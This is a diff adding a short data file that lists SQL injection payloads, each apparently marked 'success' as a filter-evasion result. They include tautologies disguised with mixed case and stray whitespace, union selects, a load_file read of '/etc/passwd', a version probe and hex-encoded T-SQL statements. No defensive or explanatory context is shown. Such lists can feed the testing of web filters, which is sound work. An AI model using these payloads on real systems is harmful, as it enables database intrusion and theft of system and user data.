@@ -1,0 +1,11 @@
+61 success " OR 'something'    LIKE    'some'+'thing' "
+275 success 'declare @s varchar  (  22  )   SeLeCT @s    like   '
+335 success " union seLEct 1,load_file  (  '/etc/passwd'  ) \x0c,1,1,1; "
+388 success '-4494 oR 5291   LiKE   4452 '
+440 success 'SELECT count  (  *  )   fRom domain.domains aS t1,domain.columns As t2,domain.tables AS t3 aND    (    (   "vqpx" LiKe "vqpx '
+499 success "Or 'something'    LIKE    'some'+'thing' "
+540 success '1 uni On SeLeCT all FROM WhERE '
+620 success " SELECT\x0b* FROm users wHere id   LIke   '(SELECT 1)' union\nSelecT +\\.,@@VERSION -- 1' ,\t"
+741 success '1 WhErE 5443   LIKe \x0b 5443 '
+758 success '\\x27UNION\x0bsELect '
+797 success 'declare @s varchar  (  200  ) \n sELeCt @s   =   0x77616974 ... '
